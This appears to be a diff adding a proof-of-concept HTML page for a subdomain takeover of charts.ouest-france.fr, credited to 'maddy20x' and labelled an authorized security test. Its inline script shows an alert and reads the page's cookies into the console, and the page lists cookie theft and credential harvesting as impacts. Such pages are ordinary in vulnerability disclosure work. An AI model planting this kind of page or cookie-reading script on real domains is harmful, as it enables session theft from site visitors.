@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Ouest-France • Security Test</title>
+</head>
+<body style="font-family: Arial, sans-serif; padding: 50px; text-align: center;">
+    <h1 style="color: red;">⚠️ Subdomain Takeover</h1>
+    <h2>charts.ouest-france.fr</h2>
+    <hr>
+    <p><strong>Status:</strong> ✓ Successfully taken over by <strong style="color: green;">maddy20x</strong></p>
+    <p><strong>Vulnerability:</strong> Unclaimed CNAME pointing to ouest-france.github.io</p>
+    <p><strong>Impact:</strong> Attacker can steal cookies, harvest credentials, bypass WAF</p>
+    <hr>
+    <p style="color: gray; font-size: 12px;">Proof of Concept • Authorized Security Test</p>
+    
+    <script>
+        alert("Subdomain takeover successful by maddy20x");
+        console.log("[+] charts.ouest-france.fr is compromised");
+        console.log("Cookies:", document.cookie);
+    </script>
+</body>
+</html>
